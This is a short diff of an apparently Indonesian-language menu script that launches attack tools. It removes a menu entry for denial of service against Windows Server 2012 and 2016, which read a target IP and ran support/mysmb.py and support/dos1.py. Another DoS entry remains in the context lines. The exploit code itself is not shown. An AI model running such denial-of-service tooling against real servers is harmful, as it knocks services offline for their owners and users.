@@ -106,14 +106,7 @@ case $choice in
     sudo python support/dos1.py $iptarget
     ;;
 
-9)  echo "Denial of Service pada Windows Server 2012, 2016)"  
-    echo -n "Masukkan ip target: "
-    read iptarget
-    sudo python support/mysmb.py
-    sudo python support/dos1.py $iptarget    
-    ;;
-
-10)  exit
+9)  exit
     ;;
 *)    echo "Maaf, menu tidak ada"
 esac
